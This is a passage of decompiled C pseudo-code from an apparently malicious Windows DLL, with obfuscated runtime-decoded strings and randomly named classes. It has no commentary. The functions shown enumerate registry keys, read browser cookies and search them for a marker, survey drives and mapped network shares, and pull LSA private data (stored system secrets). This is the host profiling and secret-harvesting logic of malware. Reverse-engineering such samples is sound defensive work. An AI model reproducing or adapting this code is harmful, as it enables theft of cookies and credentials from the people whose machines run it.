  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001CBA8);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001CBF4);
  v13 = (LPCSTR)sub_1000C0E0((int)&unk_1001CC10);
  v14 = (LPCSTR)sub_1000C0E0((int)&unk_1001CC30);
  phkResult = 0;
  LastError = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20019u, &phkResult);
  if ( !LastError )
  {
    Str = 0;
    LOBYTE(LastError) = 0;
    v24 = 0;
    v25 = 0;
    v26 = 0;
    dwIndex = 0;
    v18 = 0;
    v27 = 0;
    for ( i = this + 9635; ; i += 15 )
    {
      if ( v18 && v18 != 234 || (int)dwIndex >= 5 )
        goto LABEL_28;
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v5 = strlen(&Str);
      memset(&Str, 0, v5);
      cchName = 15;
      LastError = RegEnumKeyExA(phkResult, dwIndex, &Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      v18 = LastError;
      if ( LastError )
      {
        *i = LastError;
        goto LABEL_26;
      }
      v16 = 0;
      memset(Destination, 0, 71);
      if ( strlen(&Str) >= 0xF )
        v6 = 15;
      else
        v6 = strlen(&Str);
      strncpy((char *)i + 4, &Str, v6);
      v7 = strlen(lpSubKey);
      strncpy(Destination, lpSubKey, v7);
      PathAddBackslashA(Destination);
      if ( strlen(&Str) >= 0xF )
        v8 = 15;
      else
        v8 = strlen(&Str);
      strncat(Destination, &Str, v8);
      LastError = RegOpenKeyExA(v21, Destination, 0, 0x20019u, &v16);
      if ( !LastError )
      {
        if ( !sub_1000273E(v21, Destination, lpValueName, (LPBYTE)i + 55, 5) )
          *i = GetLastError();
        if ( !sub_1000273E(v21, Destination, v13, (LPBYTE)i + 40, 15) )
          *i = GetLastError();
        v9 = (const CHAR *)sub_1000C0E0((int)&unk_1001CC50);
        if ( !sub_1000273E(v21, Destination, v9, (LPBYTE)i + 25, 15) )
          *i = GetLastError();
        LOBYTE(LastError) = sub_1000273E(v21, Destination, v14, (LPBYTE)i + 19, 6);
        if ( (_BYTE)LastError )
          goto LABEL_23;
        LastError = GetLastError();
      }
      *i = LastError;
LABEL_23:
      if ( v16 )
        LOBYTE(LastError) = RegCloseKey(v16);
LABEL_26:
      ++dwIndex;
    }
  }
  this[9634] = LastError;
LABEL_28:
  if ( phkResult )
    LOBYTE(LastError) = RegCloseKey(phkResult);
  return LastError;
}

//----- (1000529D) --------------------------------------------------------
char __thiscall sub_1000529D(_DWORD *this, HKEY hKey)
{
  int LastError; // eax
  _DWORD *i; // ebx
  size_t v5; // eax
  size_t v6; // eax
  size_t v7; // eax
  size_t v8; // eax
  HKEY v9; // edi
  const CHAR *v10; // eax
  const CHAR *v11; // eax
  struct _FILETIME ftLastWriteTime; // [esp+10h] [ebp-24h] BYREF
  DWORD cchName; // [esp+18h] [ebp-1Ch] BYREF
  HKEY v15; // [esp+1Ch] [ebp-18h]
  LPCSTR lpValueName; // [esp+20h] [ebp-14h]
  int v17; // [esp+24h] [ebp-10h]
  HKEY v18; // [esp+28h] [ebp-Ch] BYREF
  LSTATUS v19; // [esp+2Ch] [ebp-8h]
  LPCSTR lpSubKey; // [esp+30h] [ebp-4h]
  DWORD dwIndex; // [esp+34h] [ebp+0h]
  HKEY phkResult; // [esp+38h] [ebp+4h] BYREF
  char Destination[72]; // [esp+3Ch] [ebp+8h] BYREF
  char Str[32]; // [esp+84h] [ebp+50h] BYREF

  v15 = hKey;
  lpSubKey = (LPCSTR)sub_1000C0E0((int)&unk_1001CC70);
  lpValueName = (LPCSTR)sub_1000C0E0((int)&unk_1001CCB0);
  phkResult = 0;
  LastError = RegOpenKeyExA(hKey, lpSubKey, 0, 0x20019u, &phkResult);
  v17 = LastError;
  if ( !LastError )
  {
    memset(Str, 0, 30);
    LOBYTE(LastError) = 0;
    dwIndex = 0;
    v19 = 0;
    for ( i = this + 9711; ; i += 46 )
    {
      if ( v19 && v19 != 234 || (int)dwIndex >= 5 )
        goto LABEL_26;
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      v5 = strlen(Str);
      memset(Str, 0, v5);
      cchName = 30;
      v19 = RegEnumKeyExA(phkResult, dwIndex, Str, &cchName, 0, 0, 0, &ftLastWriteTime);
      if ( v19 )
      {
        LOBYTE(LastError) = v17;
        *i = v17;
        goto LABEL_24;
      }
      v18 = 0;
      memset(Destination, 0, sizeof(Destination));
      if ( strlen(Str) >= 0x1E )
        v6 = 30;
      else
        v6 = strlen(Str);
      strncpy((char *)i + 4, Str, v6);
      v7 = strlen(lpSubKey);
      strncpy(Destination, lpSubKey, v7);
      PathAddBackslashA(Destination);
      if ( strlen(Str) >= 0x1E )
        v8 = 30;
      else
        v8 = strlen(Str);
      strncat(Destination, Str, v8);
      v9 = v15;
      LastError = RegOpenKeyExA(v15, Destination, 0, 0x20019u, &v18);
      v17 = LastError;
      if ( !LastError )
      {
        if ( !sub_1000273E(v9, Destination, lpValueName, (LPBYTE)i + 34, 15) )
          *i = GetLastError();
        v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001CCD0);
        if ( !sub_1000273E(v9, Destination, v10, (LPBYTE)i + 64, 120) )
          *i = GetLastError();
        v11 = (const CHAR *)sub_1000C0E0((int)&unk_1001CCF0);
        LOBYTE(LastError) = sub_1000273E(v9, Destination, v11, (LPBYTE)i + 49, 15);
        if ( (_BYTE)LastError )
          goto LABEL_21;
        LastError = GetLastError();
      }
      *i = LastError;
LABEL_21:
      if ( v18 )
        LOBYTE(LastError) = RegCloseKey(v18);
LABEL_24:
      ++dwIndex;
    }
  }
  this[9710] = LastError;
LABEL_26:
  if ( phkResult )
    LOBYTE(LastError) = RegCloseKey(phkResult);
  return LastError;
}

//----- (100054F9) --------------------------------------------------------
LSTATUS __thiscall sub_100054F9(int this, HKEY hKey)
{
  const CHAR *v3; // edi
  const CHAR *v4; // eax
  LSTATUS result; // eax

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001CD10);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001CD3C);
  result = sub_100026CC(hKey, v3, v4, (LPBYTE)(this + 39768), 0xFu, (void *)(this + 39784));
  *(_DWORD *)(this + 39764) = result;
  return result;
}

//----- (1000553E) --------------------------------------------------------
LSTATUS __thiscall sub_1000553E(int this, int a2)
{
  const CHAR *v3; // edi
  const CHAR *v4; // eax
  LSTATUS result; // eax

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001CD5C);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001CD84);
  result = sub_100026CC(HKEY_LOCAL_MACHINE, v3, v4, (LPBYTE)(this + 39792), 0xFu, (void *)(this + 39808));
  *(_DWORD *)(this + 39788) = result;
  return result;
}

//----- (10005584) --------------------------------------------------------
LSTATUS __thiscall sub_10005584(int this, int a2)
{
  const CHAR *v3; // edi
  const CHAR *v4; // eax
  LSTATUS result; // eax

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001CDA4);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001CDE0);
  result = sub_100026CC(HKEY_LOCAL_MACHINE, v3, v4, (LPBYTE)(this + 39816), 0x14u, (void *)(this + 39836));
  *(_DWORD *)(this + 39788) = result;
  return result;
}

//----- (100055CA) --------------------------------------------------------
int __thiscall sub_100055CA(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 32))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 36))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 40))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 44))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 48))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 52))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 56))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 60))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 64))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 68))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 72))(this, a2);
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)this + 76))(this, a2);
  return (*(int (__thiscall **)(void *, int))(*(_DWORD *)this + 80))(this, a2);
}

//----- (1000563D) --------------------------------------------------------
int __thiscall sub_1000563D(char *this, int a2)
{
  char *v3; // eax
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  char *v8; // eax
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  char *v19; // [esp-8h] [ebp-14h]
  char *v20; // [esp-8h] [ebp-14h]
  char *v21; // [esp-8h] [ebp-14h]
  char *v22; // [esp-8h] [ebp-14h]
  char *v23; // [esp-8h] [ebp-14h]
  char *v24; // [esp-8h] [ebp-14h]
  char *v25; // [esp-8h] [ebp-14h]
  char *v26; // [esp-8h] [ebp-14h]
  char *v27; // [esp-8h] [ebp-14h]
  char *v28; // [esp-8h] [ebp-14h]
  char *v29; // [esp-8h] [ebp-14h]
  char *v30; // [esp-8h] [ebp-14h]
  char *v31; // [esp-8h] [ebp-14h]
  char *v32; // [esp-8h] [ebp-14h]
  char *v33; // [esp-8h] [ebp-14h]
  char *v34; // [esp-4h] [ebp-10h]
  char *v35; // [esp-4h] [ebp-10h]
  char *v36; // [esp-4h] [ebp-10h]
  char *v37; // [esp-4h] [ebp-10h]
  char *v38; // [esp-4h] [ebp-10h]
  char *v39; // [esp-4h] [ebp-10h]
  char *v40; // [esp-4h] [ebp-10h]
  char *v41; // [esp-4h] [ebp-10h]
  char *v42; // [esp-4h] [ebp-10h]
  char *v43; // [esp-4h] [ebp-10h]
  char *v44; // [esp-4h] [ebp-10h]
  char *v45; // [esp-4h] [ebp-10h]
  char *v46; // [esp-4h] [ebp-10h]
  char *v47; // [esp-4h] [ebp-10h]
  char *v48; // [esp-4h] [ebp-10h]

  v34 = (char *)sub_1000C0E0((int)&unk_1001BE70);
  v19 = (char *)sub_1000C0E0((int)&unk_1001BEA0);
  v3 = (char *)sub_1000C0E0((int)&unk_1001BF04);
  sub_10003EE7(this, -2147483646, 0, v3, v19, v34);
  v35 = (char *)sub_1000C0E0((int)&unk_1001BF2C);
  v20 = (char *)sub_1000C0E0((int)&unk_1001BF50);
  v4 = (char *)sub_1000C0E0((int)&unk_1001BFA8);
  sub_10003EE7(this, -2147483646, 1, v4, v20, v35);
  v36 = (char *)sub_1000C0E0((int)&unk_1001BFC8);
  v21 = (char *)sub_1000C0E0((int)&unk_1001BFF0);
  v5 = (char *)sub_1000C0E0((int)&unk_1001C044);
  sub_10003EE7(this, -2147483646, 2, v5, v21, v36);
  v37 = (char *)sub_1000C0E0((int)&unk_1001C064);
  v22 = (char *)sub_1000C0E0((int)&unk_1001C088);
  v6 = (char *)sub_1000C0E0((int)&unk_1001C0EC);
  sub_10003EE7(this, -2147483646, 3, v6, v22, v37);
  v38 = (char *)sub_1000C0E0((int)&unk_1001C11C);
  v23 = (char *)sub_1000C0E0((int)&unk_1001C140);
  v7 = (char *)sub_1000C0E0((int)&unk_1001C1A4);
  sub_10003EE7(this, -2147483646, 4, v7, v23, v38);
  v39 = (char *)sub_1000C0E0((int)&unk_1001C1C8);
  v24 = (char *)sub_1000C0E0((int)&unk_1001C1F0);
  v8 = (char *)sub_1000C0E0((int)&unk_1001C248);
  sub_10003EE7(this, -2147483646, 5, v8, v24, v39);
  v40 = (char *)sub_1000C0E0((int)&unk_1001C26C);
  v25 = (char *)sub_1000C0E0((int)&unk_1001C290);
  v9 = (char *)sub_1000C0E0((int)&unk_1001C2EC);
  sub_10003EE7(this, -2147483646, 6, v9, v25, v40);
  v41 = (char *)sub_1000C0E0((int)&unk_1001C308);
  v26 = (char *)sub_1000C0E0((int)&unk_1001C328);
  v10 = (char *)sub_1000C0E0((int)&unk_1001C374);
  sub_10003EE7(this, a2, 7, v10, v26, v41);
  v42 = (char *)sub_1000C0E0((int)&unk_1001C394);
  v27 = (char *)sub_1000C0E0((int)&unk_1001C3B8);
  v11 = (char *)sub_1000C0E0((int)&unk_1001C40C);
  sub_10003EE7(this, a2, 8, v11, v27, v42);
  v43 = (char *)sub_1000C0E0((int)&unk_1001C42C);
  v28 = (char *)sub_1000C0E0((int)&unk_1001C448);
  v12 = (char *)sub_1000C0E0((int)&unk_1001C480);
  sub_10003EE7(this, a2, 9, v12, v28, v43);
  v44 = (char *)sub_1000C0E0((int)&unk_1001C4A4);
  v29 = (char *)sub_1000C0E0((int)&unk_1001C4D0);
  v13 = (char *)sub_1000C0E0((int)&unk_1001C514);
  sub_10003EE7(this, a2, 10, v13, v29, v44);
  v45 = (char *)sub_1000C0E0((int)&unk_1001C53C);
  v30 = (char *)sub_1000C0E0((int)&unk_1001C55C);
  v14 = (char *)sub_1000C0E0((int)&unk_1001C58C);
  sub_10003EE7(this, a2, 11, v14, v30, v45);
  v46 = (char *)sub_1000C0E0((int)&unk_1001C5B0);
  v31 = (char *)sub_1000C0E0((int)&unk_1001C5D8);
  v15 = (char *)sub_1000C0E0((int)&unk_1001C628);
  sub_10003EE7(this, -2147483646, 12, v15, v31, v46);
  v47 = (char *)sub_1000C0E0((int)&unk_1001C648);
  v32 = (char *)sub_1000C0E0((int)&unk_1001C664);
  v16 = (char *)sub_1000C0E0((int)&unk_1001C694);
  sub_10003EE7(this, a2, 13, v16, v32, v47);
  v48 = (char *)sub_1000C0E0((int)&unk_1001C6CC);
  v33 = (char *)sub_1000C0E0((int)&unk_1001C6F0);
  v17 = (char *)sub_1000C0E0((int)&unk_1001C740);
  sub_10003EE7(this, a2, 14, v17, v33, v48);
  return (*(int (__thiscall **)(char *, int))(*(_DWORD *)this + 24))(this, a2);
}

//----- (1000590B) --------------------------------------------------------
_DWORD *__thiscall sub_1000590B(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 24;
  *this = &RyxshrOsoycfqth::`vftable';
  memset(this + 2, 0, 0x198u);
  *v2 = this[1];
  return this;
}
// 1001CEC8: using guessed type void *RyxshrOsoycfqth::`vftable';

//----- (10005956) --------------------------------------------------------
int sub_10005956()
{
  return 408;
}

//----- (1000595C) --------------------------------------------------------
char __thiscall sub_1000595C(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x198 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x198u);
  return 1;
}

//----- (10005981) --------------------------------------------------------
char __thiscall sub_10005981(int this)
{
  const CHAR *v2; // eax
  char *v3; // eax
  char *v4; // edi
  const CHAR *v5; // eax
  const char *v6; // eax
  size_t v7; // eax
  DWORD dwSize; // [esp+8h] [ebp-8h] BYREF
  char v10; // [esp+Fh] [ebp-1h]

  dwSize = 0;
  v10 = 0;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001CE5C);
  if ( InternetGetCookieA(v2, 0, 0, &dwSize) )
  {
    v3 = (char *)operator new(dwSize);
    v4 = v3;
    if ( v3 )
    {
      memset(v3, 0, dwSize);
      v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001CE84);
      if ( InternetGetCookieA(v5, 0, v4, &dwSize) )
      {
        v6 = (const char *)sub_1000C0E0((int)&unk_1001CEAC);
        if ( strstr(v4, v6) )
        {
          if ( strlen(v4) >= 0x190 )
            v7 = 400;
          else
            v7 = strlen(v4);
          strncpy((char *)(this + 16), v4, v7);
          v10 = 1;
        }
      }
    }
    else
    {
      *(_DWORD *)(this + 12) = GetLastError();
    }
    if ( v4 )
      j__free(v4);
  }
  return v10;
}

//----- (10005A4E) --------------------------------------------------------
char __thiscall sub_10005A4E(_DWORD *this, int a2)
{
  DWORD LastError; // eax

  LOBYTE(LastError) = sub_10005981((int)this);
  if ( !(_BYTE)LastError )
  {
    LastError = GetLastError();
    this[3] = LastError;
  }
  return LastError;
}

//----- (10005A67) --------------------------------------------------------
_DWORD *__thiscall sub_10005A67(_DWORD *this)
{
  _DWORD *v2; // edi

  v2 = this + 2;
  this[1] = 19;
  *this = &EmkmfyWqwcnpWsxpczgae::`vftable';
  memset(this + 2, 0, 0x260u);
  *v2 = this[1];
  return this;
}
// 1001CF2C: using guessed type void *EmkmfyWqwcnpWsxpczgae::`vftable';

//----- (10005A95) --------------------------------------------------------
int sub_10005A95()
{
  return 608;
}

//----- (10005A9B) --------------------------------------------------------
char __thiscall sub_10005A9B(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x260 )
    return 0;
  memcpy(a2, (const void *)(this + 8), 0x260u);
  return 1;
}

//----- (10005AC0) --------------------------------------------------------
void __thiscall sub_10005AC0(char *this)
{
  int v2; // ebx
  char *v3; // esi
  int v4; // [esp+Ch] [ebp-Ch]
  _BYTE *Block; // [esp+10h] [ebp-8h]
  char *v6; // [esp+14h] [ebp-4h]

  v2 = 0;
  sub_1000CDF7();
  Block = operator new(0x1A83u);
  v4 = sub_1000CD04(Block);
  v6 = (char *)&unk_10025AE0;
  v3 = this + 20;
  do
  {
    *((_DWORD *)v3 + 1) = dword_10026B98[v2];
    *v3 = *v6;
    (*(void (__thiscall **)(char *, int, _BYTE *, int))(*(_DWORD *)this + 20))(this, v2, Block, v4);
    v6 += 29;
    ++v2;
    v3 += 40;
  }
  while ( v2 < 15 );
  j__free(Block);
}
// 10026B98: using guessed type int dword_10026B98[15];

//----- (10005B2E) --------------------------------------------------------
char __thiscall sub_10005B2E(char *this, int a2, int a3, int a4)
{
  HMODULE ModuleHandleA; // eax
  char *v6; // esi
  char *v7; // edi
  int v8; // eax
  const CHAR *v10; // [esp-4h] [ebp-34h]
  int v11; // [esp+Ch] [ebp-24h] BYREF
  int v12; // [esp+10h] [ebp-20h]
  int v13; // [esp+14h] [ebp-1Ch] BYREF
  int v14; // [esp+18h] [ebp-18h]
  int v15; // [esp+1Ch] [ebp-14h] BYREF
  int v16; // [esp+20h] [ebp-10h]
  FARPROC ProcAddress; // [esp+24h] [ebp-Ch]
  char Destination; // [esp+28h] [ebp-8h] BYREF
  __int16 v19; // [esp+29h] [ebp-7h]
  char v20; // [esp+2Bh] [ebp-5h]
  char v21; // [esp+2Fh] [ebp-1h]
  int v22; // [esp+38h] [ebp+8h]

  Destination = 0;
  v19 = 0;
  v20 = 0;
  v15 = 0;
  v16 = 0;
  v13 = 0;
  v14 = 0;
  v11 = 0;
  v12 = 0;
  v21 = 0;
  v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001CEE4);
  ModuleHandleA = GetModuleHandleA(aKernel32Dll_0);
  ProcAddress = GetProcAddress(ModuleHandleA, v10);
  v6 = &this[40 * a2];
  Destination = v6[20];
  strncat(&Destination, asc_1001CF1C, 3u);
  if ( GetDriveTypeA(&Destination) != 2 )
    goto LABEL_15;
  v7 = (char *)(a3 + 1);
  v22 = 26;
  do
  {
    v8 = *v7 - Destination;
    if ( !v8 || abs(v8) == 32 )
      v21 = 1;
    v7 += 261;
    --v22;
  }
  while ( v22 );
  if ( v21 && a4 )
  {
LABEL_15:
    if ( ((unsigned __int8 (__stdcall *)(char *, int *, int *, int *))ProcAddress)(&Destination, &v15, &v13, &v11) )
    {
      *((_DWORD *)v6 + 8) = v15;
      *((_DWORD *)v6 + 9) = v16;
      *((_DWORD *)v6 + 10) = v13;
      *((_DWORD *)v6 + 11) = v14;
      *((_DWORD *)v6 + 12) = v11;
      *((_DWORD *)v6 + 13) = v12;
      return 1;
    }
    *((_DWORD *)v6 + 4) = GetLastError();
  }
  return 0;
}

//----- (10005C3D) --------------------------------------------------------
_DWORD *__thiscall sub_10005C3D(_DWORD *this, char a2)
{
  _DWORD *v3; // edi

  v3 = this + 1719;
  this[1] = 26;
  *this = &TvtcxlnTfxYjbzSiwtVtcxlntfx::`vftable';
  *((_BYTE *)this + 6872) = a2;
  memset(this + 1719, 0, 0x2CC8u);
  *v3 = this[1];
  return this;
}
// 1001D40C: using guessed type void *TvtcxlnTfxYjbzSiwtVtcxlntfx::`vftable';

//----- (10005C7A) --------------------------------------------------------
int __thiscall sub_10005C7A(_BYTE *this)
{
  return this[6872] != 0 ? 6864 : 11464;
}

//----- (10005C8F) --------------------------------------------------------
char __thiscall sub_10005C8F(int this, void *a2, unsigned int a3)
{
  if ( a3 < 0x2CC8 )
    return 0;
  memcpy(a2, (const void *)(this + 6876), 0x2CC8u);
  return 1;
}

//----- (10005CB7) --------------------------------------------------------
void *__thiscall sub_10005CB7(_DWORD *this)
{
  _DWORD *v1; // edi
  const CHAR *v2; // eax
  HMODULE ModuleHandleA; // ebx
  void *result; // eax
  const CHAR *v5; // eax
  char *i; // ebx
  DWORD v7; // eax
  BYTE *v8; // edi
  const WCHAR *v9; // eax
  const WCHAR *v10; // eax
  int v11; // eax
  struct hostent *v12; // eax
  FARPROC ProcAddress; // [esp+10h] [ebp-7Ch]
  DWORD TotalEntries; // [esp+14h] [ebp-78h] BYREF
  DWORD EntriesRead; // [esp+18h] [ebp-74h] BYREF
  unsigned int v17; // [esp+1Ch] [ebp-70h]
  int v18; // [esp+20h] [ebp-6Ch]
  LPBYTE BufPtr; // [esp+24h] [ebp-68h] BYREF
  struct WSAData WSAData; // [esp+28h] [ebp-64h] BYREF
  CHAR pszPath[2]; // [esp+1B8h] [ebp+12Ch] BYREF
  char name[262]; // [esp+1BAh] [ebp+12Eh] BYREF
  WCHAR String1[62]; // [esp+2C0h] [ebp+234h] BYREF

  v1 = this;
  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001CFCC);
  ModuleHandleA = GetModuleHandleA(v2);
  if ( !ModuleHandleA
    || (v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001CFF0), (ProcAddress = GetProcAddress(ModuleHandleA, v5)) == 0) )
  {
    result = (void *)GetLastError();
LABEL_3:
    v1[1720] = result;
    return result;
  }
  BufPtr = 0;
  EntriesRead = 0;
  TotalEntries = 0;
  result = (void *)NetUseEnum(0, 2u, &BufPtr, 0xFFFFFFFF, &EntriesRead, &TotalEntries, 0);
  if ( result )
    goto LABEL_3;
  result = (void *)WSAStartup(0x101u, &WSAData);
  if ( result )
    goto LABEL_3;
  v17 = 0;
  v18 = 0;
  for ( i = (char *)v1 + 6945; ; i += 192 )
  {
    v7 = EntriesRead;
    if ( EntriesRead >= 0x14 )
      v7 = 20;
    if ( v17 >= v7 )
      break;
    v8 = &BufPtr[v18];
    memset(String1, 0, 0x7Au);
    if ( *(_DWORD *)&BufPtr[v18] )
    {
      lstrcpynW(String1, *(LPCWSTR *)&BufPtr[v18], 60);
      WideCharToMultiByte(0, 0, String1, -1, i - 61, 60, 0, 0);
    }
    memset(String1, 0, 0x7Au);
    v9 = (const WCHAR *)*((_DWORD *)v8 + 1);
    if ( v9 )
    {
      lstrcpynW(String1, v9, 60);
      WideCharToMultiByte(0, 0, String1, -1, i, 60, 0, 0);
    }
    memset(String1, 0, 0x7Au);
    v10 = (const WCHAR *)*((_DWORD *)v8 + 7);
    if ( v10 )
    {
      lstrcpynW(String1, v10, 60);
      WideCharToMultiByte(0, 0, String1, -1, i + 67, 60, 0, 0);
    }
    LOBYTE(v11) = -1;
    if ( *((_DWORD *)v8 + 3) < 0xFFu )
      v11 = *((_DWORD *)v8 + 3);
    i[128] = v11;
    if ( !*((_DWORD *)v8 + 3) && lstrlenA(i) > 0 && PathIsUNCServerShareA(i) )
    {
      lstrcpyA(pszPath, i);
      PathRemoveFileSpecA(pszPath);
      v12 = gethostbyname(name);
      if ( v12 )
        *(_DWORD *)(i + 63) = **(_DWORD **)v12->h_addr_list;
    }
    ++v17;
    v18 += 36;
    v1 = this;
  }
  if ( BufPtr )
    ((void (__stdcall *)(LPBYTE))ProcAddress)(BufPtr);
  WSACleanup();
  return memcpy(&unk_10025C94, v1 + 1720, 0xF04u);
}
// 10005CB7: using guessed type char name[262];

//----- (10005EFA) --------------------------------------------------------
void *__stdcall sub_10005EFA(wchar_t *String, void *a2)
{
  int Src[2]; // [esp+8h] [ebp-8h] BYREF

  Src[1] = (int)String;
  LOWORD(Src[0]) = 2 * wcslen(String);
  HIWORD(Src[0]) = 2 * wcslen(String) + 2;
  return memcpy(a2, Src, 8u);
}

//----- (10005F45) --------------------------------------------------------
void *__thiscall sub_10005F45(void *this, void *a2, void *a3)
{
  NTSTATUS v3; // edi
  const CHAR *v4; // eax
  NTSTATUS v5; // eax
  size_t Length; // ecx
  struct _LSA_OBJECT_ATTRIBUTES ObjectAttributes; // [esp+Ch] [ebp-70h] BYREF
  struct _LSA_UNICODE_STRING KeyName; // [esp+24h] [ebp-58h] BYREF
  void *v10; // [esp+2Ch] [ebp-50h]
  void *v11; // [esp+30h] [ebp-4Ch]
  ULONG Src; // [esp+34h] [ebp-48h] BYREF
  PVOID PolicyHandle; // [esp+38h] [ebp-44h] BYREF
  PLSA_UNICODE_STRING PrivateData; // [esp+3Ch] [ebp-40h] BYREF
  WCHAR WideCharStr[28]; // [esp+40h] [ebp-3Ch] BYREF

  v10 = a3;
  v11 = this;
  PolicyHandle = 0;
  memset(WideCharStr, 0, 54);
  KeyName.Length = 0;
  *(_DWORD *)&KeyName.MaximumLength = 0;
  HIWORD(KeyName.Buffer) = 0;
  memset(&ObjectAttributes, 0, sizeof(ObjectAttributes));
  PrivateData = 0;
  Src = 0;
  v3 = LsaOpenPolicy(0, &ObjectAttributes, 4u, &PolicyHandle);
  if ( !LsaNtStatusToWinError(v3) )
  {
    v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001D018);
    if ( MultiByteToWideChar(0, 0, v4, -1, WideCharStr, 27) )
      sub_10005EFA(WideCharStr, &KeyName);
    v5 = LsaRetrievePrivateData(PolicyHandle, &KeyName, &PrivateData);
    v3 = v5;
    if ( PrivateData && !LsaNtStatusToWinError(v5) )
    {
      Length = PrivateData->Length;
      if ( PrivateData->Length >= 0x12Cu )
        Length = 300;
      memcpy(a2, PrivateData->Buffer, Length);
    }
  }
  if ( PolicyHandle )
    LsaClose(PolicyHandle);
  if ( PrivateData )
    LsaFreeMemory(PrivateData);
  Src = LsaNtStatusToWinError(v3);
  return memcpy(v10, &Src, 4u);
}

//----- (1000606F) --------------------------------------------------------
HMODULE __usercall sub_1000606F@<eax>(char *a1@<ecx>, int a2@<esi>)
{
  const CHAR *v3; // eax
  HMODULE result; // eax
  const CHAR *v5; // eax
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  FARPROC v8; // eax
  unsigned __int8 v9; // al
  CHAR *v10; // esi
  char *i; // edi
  unsigned int v12; // eax
  int (__stdcall *v14)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // [esp+8h] [ebp-80h]
  int v15; // [esp+Ch] [ebp-7Ch] BYREF
  int v16; // [esp+10h] [ebp-78h] BYREF
  int v17; // [esp+14h] [ebp-74h] BYREF
  FARPROC v18; // [esp+18h] [ebp-70h]
  HMODULE hModule; // [esp+1Ch] [ebp-6Ch]
  unsigned int v20; // [esp+20h] [ebp-68h] BYREF
  FARPROC ProcAddress; // [esp+24h] [ebp-64h]
  int v22; // [esp+28h] [ebp-60h] BYREF
  CHAR String2[15956]; // [esp+2Ch] [ebp-5Ch] BYREF
  int v24; // [esp+3E80h] [ebp+3DF8h] BYREF
  CHAR String1[515]; // [esp+3E84h] [ebp+3DFCh] BYREF
  char Src[15]; // [esp+4087h] [ebp+3FFFh] BYREF
  int v27[4]; // [esp+42A4h] [ebp+421Ch] BYREF
  char v28[3]; // [esp+42B4h] [ebp+422Ch] BYREF
  char v29[11]; // [esp+42BFh] [ebp+4237h] BYREF

  sub_10005F45(a1, a1 + 11024, a1 + 11020);
  v22 = 0;
  memset(String2, 0, sizeof(String2));
  v15 = 15960;
  v20 = 0;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001D048);
  result = LoadLibraryA(v3);
  hModule = result;
  if ( result )
  {
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001D06C);
    ProcAddress = GetProcAddress(hModule, v5);
    v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001D090);
    v18 = GetProcAddress(hModule, v6);
    v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001D0BC);
    v8 = GetProcAddress(hModule, v7);
    v14 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v8;
    if ( ProcAddress )
    {
      if ( v18 )
      {
        if ( v8 )
        {
          v22 = 532;
          if ( !((int (__stdcall *)(_DWORD, _DWORD, int *, int *, unsigned int *))ProcAddress)(0, 0, &v22, &v15, &v20) )
          {
            v9 = -1;
            if ( v20 <= 0xFF )
              v9 = v20;
            *((_DWORD *)a1 + 2681) = v9;
            ProcAddress = 0;
            v10 = String2;
            for ( i = a1 + 10731; ; i += 29 )
            {
              v12 = 10;
              if ( v20 < 0xA )
                v12 = v20;
              if ( (unsigned int)ProcAddress >= v12 )
                break;
              v24 = 1060;
              lstrcpynA(String1, v10, 256);
              v17 = 0;
              if ( !((int (__stdcall *)(_DWORD, int *, int *, int))v18)(0, &v24, &v17, a2) )
                memcpy(i + 11, Src, 0xFu);
              a2 = 0;
              v16 = 5000;
              v27[0] = 2924;
              if ( !v14(0, v10, v27, &v16, 0) )
              {
                memcpy(i, v29, 0xBu);
                memcpy(i - 3, v28, 3u);
              }
              ProcAddress = (FARPROC)((char *)ProcAddress + 1);
              v10 += 532;
            }
          }
        }
      }
    }
    return (HMODULE)FreeLibrary(hModule);
  }
  return result;
}
// 1000606F: could not find valid save-restore pair for esi
// 1000606F: using guessed type CHAR String1[515];
